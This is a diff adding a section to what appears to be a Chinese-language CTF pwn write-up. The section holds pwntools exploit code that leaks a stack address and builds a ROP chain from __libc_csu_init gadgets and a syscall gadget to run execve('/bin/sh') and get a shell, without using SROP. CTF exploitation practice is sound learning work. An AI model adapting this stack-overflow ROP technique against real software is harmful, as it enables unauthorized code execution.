@@ -92,3 +92,26 @@ payload = b'A' * 16 + p64(gadgets_addr) + p64(syscall_ret_addr) + bytes(sigframe
 p.sendline(payload)
 p.interactive()
 ```
+
+## 0x004 不使用SROP
+
+```
+payload = b'/bin/sh\x00' + b"A" * 8 + p64(0x4004ed)
+p.sendline(payload)
+p.recv(32)
+bin_sh_addr = u64(p.recv(8)) - 0x128
+print (hex(bin_sh_addr))
+
+gadget_execve = 0x4004e2
+libc_csu_init_pop = 0x40059A
+libc_csu_init_call = 0x400580
+pop_rdi_ret = 0x4005a3
+syscall_addr = 0x400501
+
+payload2 = b'/bin/sh\x00' + b"A" * 8 + p64(gadget_execve) + p64(libc_csu_init_pop)
+payload2 += p64(0)*2 + p64(bin_sh_addr+0x58) + p64(0)*3 + p64(libc_csu_init_call)
+payload2 += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(syscall_addr)
+
+p.sendline(payload2)
+p.interactive()
+```
